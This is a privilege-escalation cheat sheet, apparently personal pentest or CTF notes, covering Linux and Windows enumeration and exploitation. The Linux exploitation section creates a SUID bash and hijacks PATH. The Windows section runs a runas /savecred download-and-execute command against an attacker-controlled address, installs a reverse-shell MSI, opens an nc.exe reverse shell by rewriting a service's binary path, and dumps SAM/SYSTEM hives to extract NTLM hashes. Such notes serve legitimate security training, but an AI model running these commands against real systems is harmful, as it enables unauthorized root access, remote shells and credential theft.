
The first rule of privesc...
# ALWAYS *THOROUGHLY* LOOK AROUND FIRST!


# Linux

## linpeas

Always run this when possible.
`/usr/share/peass/linpeas/linpeas.sh`

## Enumeration

`id` List user ID and groups.
Manually enumerate user home directories for interesting files.
`history` or `less .bash_history` etc. Check shell history.
`ls -al /` Look for signs that user is in a docker container.
`findmnt` Find mounts connected to the system.
`mount` Check for docker container or unsafe mounts.
`export -p` and `env` View/modify environment variables.
`echo $PATH` Check the path.
Relative path program exploits.
`sudo -l` List commands user can run as root.
`find / -perm -4000 2>/dev/null` Find SUID binaries.
Check `/etc/apache2` and `/etc/nginx` for `sites-available` files to enumerate.
Check `/var/www` and `/opt` for interesting files.
`git log -p > all-git-commits.txt` Inspect git commits.
Find web server, git, and other config files that may contain credentials.
Check databases for credentials.
Find SSH key files.
`crontab -l` List user crontab.
`cat /etc/crontab` List system crontab.
`ps auxww | grep root` Investigate interesting root processes.
`pspy` Spy on processes to find cron jobs.
Modify vulnerable shell scripts, config files, environment variables, etc.
`ls -al /var/mail` Check user mail.
`docker` Exploit docker containers.
`kubeletctl` Exploit Kubernetes containers.
Run LinPEAS.
`find / -type f -user username 2>/dev/null` Find interesting files owned by username.
`lsattr` Check for vulnerable file attributes.
`getcap -r / 2>/dev/null` Find tools on the system that can do network stuff.
Get OS kernel and release info with `uname -a`, `lsb_release -a`, or `cat /etc/*release`.
`ss -tlpn` Show all listening ports and processes.
`netstat -ant` Show all TCP services.
`find -perm -o=w 2>/dev/null` Find world-writable files.
## Exploitation

Possible Simple Vector via Sudo
`sudo su`

Create SUID Bash (E.g., Leverage hacked cron job or container root access to host filesystem)
```
cp /bin/bash /tmp/bash
chown root:root /tmp/bash
chmod 4755 /tmp/bash
```

Execute SUID Bash
`bash -p`

Path Variable Hijacking (e.g., for cron job binary without absolute path)
`export PATH=/tmp:$PATH`

Less (System Pager / Text Scroller) Exploitation :)
`!/path/to/program`

### rbash Breakout

Literally just spawn a different shell. Use GTFOBins if needed.

# Windows

## winPEAS

Always run this when possible.
`/usr/share/peass/winpeas/winPEAS.bat`

## Enumeration

Display Stored Usernames and Credentials
`cmdkey /list`

Find RunAs Shortcuts
```
gci ​"C:\"​ *.lnk -recurse -force | ft fullname | ​out-file shortcuts.txt
foreach​ (​$file​ ​in​ gc .\shortcuts.txt) { ​write-output​ ​$file​; gc ​$file​ | sls​ runas }

NOTE: The foreach loop did not work in my remote shell when testing this, but I've noted it to come back to.
```

Elevate Privs Using RunAs SaveCred with Revshell
`runas /user:domain\adminusername /savecred ​"powershell -c iex (new-object net.webclient).downloadstring('http://ipaddress/file')"`

Net User Groups
`net user username`

Whoami Groups
`whoami /groups`

Read PowerShell History
`type c:\users\username\appdata\roaming\microsoft\windows\powershell\psreadline\consolehost_history.txt`

Enumerate Installed Software
```
dir "C:\Program Files"
dir "C:\Program Files (x86)"

Get version info from changelog files.
```

Enumerate Services (even when sc.exe is denied permission)
`reg query "HKLM\System\CurrentControlSet\Services"`

Get Service Details (sc.exe)
`sc.exe qc servicename`

Get Service Details (registry)
`reg query "HKLM\System\CurrentControlSet\Services\servicename"`

List Processes
`get-process`

List processes and associated services (cmd)
`tasklist /svc`

Dump Process Memory. E.g., Firefox, KeePassXC
`procdump.exe -ma pid process.dmp`

Extract Strings from Binary Files
`strings -el process.dmp`

Check for System MSI Install Privs
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Check AppLocker Policy
`get-applockerpolicy -effective | select -expandproperty rulecollections`

Install MSI (Revshell, etc.) File
`msiexec /quiet /i reverse.msi`
## Exploitation

Service Binary Path Revshell
```
Users who are in the "Server Operators" group can modify, start, and stop system services.

Example of revshell via service binary path (e.g., vss service):

sc.exe config servicename binPath="c:\users\username\nc.exe -e cmd.exe ipaddress port"

nc -lvnp port

sc.exe stop servicename
sc.exe start servicename

WARNING: The above shell is unstable and will probably die after seconds.
Use meterpreter instead.
```

Grant Domain User Privs via PowerView
```
. .\PowerView.ps1
add-objectacl -principalidentity username -credential $cred -rights privname
```

Get User NTLM Hashes via Registry Hives
```
Copy the following files to the attack box:
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM

Dump the hashes:
samdump2 SYSTEM SAM

(Crack with john, etc.)
```
